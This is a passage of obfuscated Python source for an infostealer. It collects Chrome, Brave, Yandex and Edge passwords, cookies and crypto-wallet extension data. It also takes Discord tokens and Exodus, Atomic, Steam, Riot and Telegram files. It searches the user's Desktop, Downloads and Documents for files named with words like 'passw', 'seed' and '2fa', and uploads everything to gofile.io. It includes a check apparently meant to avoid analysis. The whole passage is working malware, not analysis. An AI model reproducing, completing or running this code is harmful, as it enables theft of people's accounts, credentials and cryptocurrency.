        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/ejbalbakoplchlghecdalmeeeajnimhm"              ]
    ]

    d15C0rDP47H5 = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    P47H570Z1P = [
        [f"{roaming}/Atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g3770K3N, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in d15C0rDP47H5: 
        a = threading.Thread(target=G37D15C0rD, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g37P455W, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=G47H3rZ1P5, args=[br0W53rP47H5, P47H570Z1P, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TrU57(C00K13s)
    if DETECTED == True: return

    for thread in Threadlist: 
        thread.join()
    global uP7Hs
    uP7Hs = []

    for file in ["cspassw.txt", "cscook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        UP104D(file.replace(".txt", ""), uP104D7060F113(os.getenv("TEMP") + "\\" + file))


def uP104D7060F113(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

def K1W1F01D3r(pathF, keywords):
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uP104D7060F113(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    K1W1F113s.append(["folder", pathF + "/", ffound])

K1W1F113s = []
def K1W1F113(path, keywords):
    global K1W1F113s
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uP104D7060F113(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    K1W1F01D3r(target, keywords)
                    break

    K1W1F113s.append(["folder", path, fifound])

def K1W1():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "seed",
        "seedphrase"
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "wallets",
        "crypto",
        "exodus",
        "seed",
        "seedphrase"
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p

k3YW0rd = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

C00K1C0UNt, P455WC0UNt = 0, 0
c00K1W0rDs = []
p45WW0rDs = []

W411375Z1p = [] # [Name, Link]
G4M1N6Z1p = []
O7H3rZ1p = []

G47H3r411()
DETECTED = TrU57(C00K13s)
# DETECTED = False
if not DETECTED:
    wikith = K1W1()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in K1W1F113s:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f" <:openfolderblackandwhitevariant:1042409305254670356> {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─<:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    UP104D("kiwi", filetext)
